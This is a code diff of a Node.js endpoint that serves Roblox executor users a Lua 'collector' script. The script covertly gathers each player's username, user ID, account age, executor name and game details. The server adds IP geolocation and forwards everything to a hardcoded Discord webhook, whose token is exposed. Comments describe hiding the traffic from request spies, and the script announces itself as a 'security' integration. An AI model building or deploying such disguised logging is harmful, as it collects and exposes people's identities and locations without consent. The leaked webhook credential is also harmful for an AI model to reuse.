@@ -1,64 +1,74 @@
 const https = require('https');
 
-// === CONFIGURATION === \\
 const SETTINGS = {
-    // Webhook Lu (Aman di server, gaib dari HTTP Spy)
     WEBHOOK: "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5",
-    
-    // Respon jika dibuka di browser (Plain Text)
-    PLAIN_TEXT_RESP: "kontol"
+    PLAIN_TEXT_RESP: "memrk"
 };
 
-// --- FUNGSI GEOLOCATION (Server-Side) ---
 async function getGeo(ip) {
     return new Promise((resolve) => {
-        https.get(`https://ipwho.is/${ip}`, (res) => {
+        const req = https.get(`https://ipwho.is/${ip}`, (res) => {
             let data = '';
             res.on('data', d => data += d);
-            res.on('end', () => resolve(JSON.parse(data)));
-        }).on('error', () => resolve({}));
+            res.on('end', () => {
+                try { resolve(JSON.parse(data)); } catch(e) { resolve({}); }
+            });
+        });
+        req.on('error', () => resolve({}));
+        req.setTimeout(2000, () => req.destroy());
     });
 }
 
-// === MAIN EXPORT === \\
 module.exports = async (req, res) => {
     res.setHeader('Content-Type', 'text/plain');
     const agent = req.headers['user-agent'] || "";
     const ip = req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0] || "unknown";
-    
-    // Ambil data yang dikirim dari Roblox
     const { step, u, uid, exec, pid, pname, jid, pcount, pmax, age } = req.query;
 
-    // Proteksi: Jika bukan Roblox, kasih link plain text
     if (!agent.includes("Roblox")) return res.status(200).send(SETTINGS.PLAIN_TEXT_RESP);
 
-    // --- STEP 0: COLLECTOR (Otomatis ngambil data Roblox) ---
+    // --- STEP 0: THE SILENT COLLECTOR ---
     if (!step) {
         const host = req.headers.host;
         const path = req.url.split('?')[0];
+        
+        // Gue pake pcall dan request internal biar ga muncul link panjang di console/spy
         const collector = `
             local lp = game.Players.LocalPlayer
             local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
-            local exec = (identifyexecutor and identifyexecutor()) or "Unknown"
-            
             local function getAge()
-                local success, res = pcall(function() return game:HttpGet("https://users.roblox.com/v1/users/"..lp.UserId) end)
-                if not success then return "-" end
-                local data = game:GetService("HttpService"):JSONDecode(res)
-                return data.created:sub(1,10)
+                local s, r = pcall(function() return game:HttpGet("https://users.roblox.com/v1/users/"..lp.UserId) end)
+                return (s and game:GetService("HttpService"):JSONDecode(r).created:sub(1,10)) or "-"
             end
 
-            local q = string.format("?step=1&u=%s&uid=%d&exec=%s&pid=%d&pname=%s&jid=%s&pcount=%d&pmax=%d&age=%s",
-                game.HttpService:UrlEncode(lp.Name), lp.UserId, game.HttpService:UrlEncode(exec),
-                game.PlaceId, game.HttpService:UrlEncode(info.Name), game.JobId, #game.Players:GetPlayers(), game.Players.MaxPlayers, getAge())
-            
-            game:HttpGet("https://${host}${path}" .. q)
-            print("Successfully Integrated with Ndraawz Security")
+            local data = {
+                step = "1",
+                u = lp.Name,
+                uid = lp.UserId,
+                exec = (identifyexecutor and identifyexecutor()) or "Unknown",
+                pid = game.PlaceId,
+                pname = info.Name,
+                jid = game.JobId,
+                pcount = #game.Players:GetPlayers(),
+                pmax = game.Players.MaxPlayers,
+                age = getAge()
+            }
+
+            local params = ""
+            for k, v in pairs(data) do
+                params = params .. k .. "=" .. game.HttpService:UrlEncode(tostring(v)) .. "&"
+            end
+
+            -- PENTING: Pake pcall biar ga error di client
+            pcall(function()
+                game:HttpGet("https://${host}${path}?" .. params)
+            end)
+            print("Successfully Integrated")
         `.trim();
         return res.status(200).send(collector);
     }
 
-    // --- STEP 1: LOGGING KE DISCORD ---
+    // --- STEP 1: SEND TO DISCORD ---
     try {
         const geo = await getGeo(ip);
         const flag = geo.country_code ? geo.country_code.toUpperCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0) + 127397)) : "🏴‍☠️";
@@ -82,16 +92,17 @@ module.exports = async (req, res) => {
             timestamp: new Date().toISOString()
         };
 
-        const url = new URL(SETTINGS.WEBHOOK);
-        const webhookReq = https.request({
-            hostname: url.hostname, path: url.pathname, method: 'POST',
+        const discordReq = https.request(SETTINGS.WEBHOOK, {
+            method: 'POST',
             headers: { 'Content-Type': 'application/json' }
         });
-        webhookReq.write(JSON.stringify({ embeds: [embed] }));
-        webhookReq.end();
+        
+        discordReq.write(JSON.stringify({ embeds: [embed] }));
+        discordReq.end();
 
-        return res.status(200).send("-- Logged --");
+        // Kasih respon cepet biar Roblox ga timeout
+        return res.status(200).send("OK");
     } catch (err) {
-        return res.status(500).send("-- Error");
+        return res.status(500).send("ERR");
     }
 };
